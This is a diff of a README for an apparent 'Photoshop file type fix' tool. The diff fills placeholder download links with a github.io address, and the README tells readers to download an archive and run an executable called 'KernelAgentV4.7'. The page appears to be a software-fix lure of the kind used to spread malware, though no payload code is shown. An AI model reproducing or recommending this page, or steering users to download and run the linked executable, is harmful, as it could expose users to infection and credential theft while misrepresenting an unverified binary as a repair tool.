@@ -2,13 +2,15 @@
 
 This tool helps resolve the error “Photoshop does not recognize this type of file” by identifying format conflicts, repairing corrupted headers, and converting unsupported files using `KernelAgentV4.7`.
 
-[![Download File Recognition Fix](https://img.shields.io/badge/Download-Photoshop_FileType_Fix-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download File Recognition Fix](https://img.shields.io/badge/Download-Photoshop_FileType_Fix-blueviolet)](https://photoshop-unrecognized-filetype-fix.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://photoshop-unrecognized-filetype-fix.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g., `C:\PhotoshopFileFix`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7`  
 4. 🧠 The tool will scan files, identify corrupt headers or unsupported formats, and convert them to a compatible type (PSD, TIFF, PNG)  
